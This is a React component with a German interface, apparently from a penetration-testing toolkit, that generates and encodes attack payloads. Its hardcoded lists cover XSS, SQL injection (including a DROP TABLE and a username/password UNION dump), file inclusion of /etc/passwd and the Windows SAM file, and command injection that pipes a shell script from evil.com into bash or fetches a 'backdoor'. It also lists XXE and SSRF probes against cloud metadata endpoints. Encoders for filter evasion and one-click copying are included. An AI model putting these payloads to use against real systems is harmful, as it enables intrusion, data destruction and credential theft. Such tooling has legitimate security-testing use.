import { useState } from 'react'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Label } from '@/components/ui/label'
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select'
import { Textarea } from '@/components/ui/textarea'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { Code, Copy, Sparkle } from '@phosphor-icons/react'
import { toast } from 'sonner'

export function PayloadGenerator() {
  const [attackType, setAttackType] = useState('xss')
  const [encoding, setEncoding] = useState('none')
  const [payloads, setPayloads] = useState<string[]>([])

  const payloadTemplates: Record<string, string[]> = {
    xss: [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      '"><script>alert(String.fromCharCode(88,83,83))</script>',
      '<iframe src="javascript:alert(\'XSS\')">',
      '<body onload=alert("XSS")>',
      '<input onfocus=alert("XSS") autofocus>',
      '<select onfocus=alert("XSS") autofocus>',
      '<marquee onstart=alert("XSS")>',
      'javascript:alert("XSS")'
    ],
    sql: [
      "' OR '1'='1",
      "' OR '1'='1' --",
      "' OR '1'='1' /*",
      "admin' --",
      "admin' #",
      "1' UNION SELECT NULL, NULL, NULL--",
      "' WAITFOR DELAY '00:00:05'--",
      "1'; DROP TABLE users--",
      "' AND 1=CONVERT(int, (SELECT @@version))--",
      "' UNION SELECT username, password FROM users--"
    ],
    lfi: [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '....//....//....//etc/passwd',
      'php://filter/convert.base64-encode/resource=index.php',
      'expect://id',
      'file:///etc/passwd',
      '/var/log/apache2/access.log',
      'C:\\Windows\\System32\\config\\SAM'
    ],
    rce: [
      '; ls -la',
      '| whoami',
      '`id`',
      '$(whoami)',
      '; cat /etc/passwd',
      '&& net user',
      '| ping -c 10 127.0.0.1',
      '; curl http://evil.com/shell.sh | bash',
      '`wget http://evil.com/backdoor`'
    ],
    xxe: [
      '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>'
    ],
    ssrf: [
      'http://localhost',
      'http://127.0.0.1',
      'http://169.254.169.254/latest/meta-data/',
      'http://metadata.google.internal/computeMetadata/v1/',
      'file:///etc/passwd',
      'dict://localhost:11211/stat',
      'gopher://localhost:6379/_'
    ]
  }

  const generatePayloads = () => {
    let generated = payloadTemplates[attackType] || []

    if (encoding === 'url') {
      generated = generated.map(p => encodeURIComponent(p))
    } else if (encoding === 'base64') {
      generated = generated.map(p => btoa(p))
    } else if (encoding === 'html') {
      generated = generated.map(p => 
        p.split('').map(c => `&#${c.charCodeAt(0)};`).join('')
      )
    } else if (encoding === 'unicode') {
      generated = generated.map(p => 
        p.split('').map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`).join('')
      )
    }

    setPayloads(generated)
    toast.success(`${generated.length} Payloads generiert`)
  }

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text)
    toast.success('In Zwischenablage kopiert')
  }

  const copyAll = () => {
    navigator.clipboard.writeText(payloads.join('\n'))
    toast.success('Alle Payloads kopiert')
  }

  return (
    <Card className="border-primary/20">
      <CardHeader>
        <CardTitle className="flex items-center gap-2">
          <Code className="w-5 h-5 text-primary" weight="duotone" />
          Payload-Generator & Encoder
        </CardTitle>
        <CardDescription className="font-mono text-xs">
          Angriffs-Payloads generieren und kodieren
        </CardDescription>
      </CardHeader>
      <CardContent className="space-y-4">
        <div className="grid gap-4 md:grid-cols-2">
          <div className="space-y-2">
            <Label htmlFor="attack-type">Angriffstyp</Label>
            <Select value={attackType} onValueChange={setAttackType}>
              <SelectTrigger id="attack-type" className="bg-secondary border-primary/30">
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="xss">Cross-Site Scripting (XSS)</SelectItem>
                <SelectItem value="sql">SQL Injection</SelectItem>
                <SelectItem value="lfi">Local File Inclusion (LFI)</SelectItem>
                <SelectItem value="rce">Remote Code Execution (RCE)</SelectItem>
                <SelectItem value="xxe">XML External Entity (XXE)</SelectItem>
                <SelectItem value="ssrf">Server-Side Request Forgery (SSRF)</SelectItem>
              </SelectContent>
            </Select>
          </div>

          <div className="space-y-2">
            <Label htmlFor="encoding-type">Kodierung</Label>
            <Select value={encoding} onValueChange={setEncoding}>
              <SelectTrigger id="encoding-type" className="bg-secondary border-primary/30">
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="none">Keine</SelectItem>
                <SelectItem value="url">URL-Kodierung</SelectItem>
                <SelectItem value="base64">Base64</SelectItem>
                <SelectItem value="html">HTML-Entitäten</SelectItem>
                <SelectItem value="unicode">Unicode</SelectItem>
              </SelectContent>
            </Select>
          </div>
        </div>

        <Button 
          onClick={generatePayloads}
          className="w-full bg-primary hover:bg-primary/90 gap-2"
        >
          <Sparkle className="w-4 h-4" weight="fill" />
          Payloads generieren
        </Button>

        {payloads.length > 0 && (
          <div className="space-y-3">
            <div className="flex items-center justify-between">
              <Label>Generierte Payloads ({payloads.length})</Label>
              <Button 
                size="sm" 
                variant="outline"
                onClick={copyAll}
                className="gap-2"
              >
                <Copy className="w-3 h-3" />
                Alle kopieren
              </Button>
            </div>

            <Tabs defaultValue="list" className="w-full">
              <TabsList className="grid w-full grid-cols-2 bg-card border border-primary/20">
                <TabsTrigger value="list">Liste</TabsTrigger>
                <TabsTrigger value="raw">Roh-Text</TabsTrigger>
              </TabsList>
              <TabsContent value="list" className="space-y-2 mt-3">
                <div className="max-h-96 overflow-y-auto space-y-2">
                  {payloads.map((payload, idx) => (
                    <div 
                      key={idx}
                      className="flex items-start gap-2 p-3 rounded-md bg-secondary/50 border border-primary/20 group"
                    >
                      <div className="flex-1 overflow-hidden">
                        <div className="flex items-center gap-2 mb-1">
                          <span className="text-[10px] font-mono text-muted-foreground">
                            #{idx + 1}
                          </span>
                        </div>
                        <code className="text-xs font-mono text-primary break-all">
                          {payload}
                        </code>
                      </div>
                      <Button
                        size="icon"
                        variant="ghost"
                        className="h-8 w-8 shrink-0 opacity-0 group-hover:opacity-100 transition-opacity"
                        onClick={() => copyToClipboard(payload)}
                      >
                        <Copy className="w-3 h-3" />
                      </Button>
                    </div>
                  ))}
                </div>
              </TabsContent>
              <TabsContent value="raw" className="mt-3">
                <Textarea
                  value={payloads.join('\n')}
                  readOnly
                  className="bg-secondary border-primary/30 font-mono min-h-[400px] text-xs"
                />
              </TabsContent>
            </Tabs>
          </div>
        )}
      </CardContent>
    </Card>
  )
}
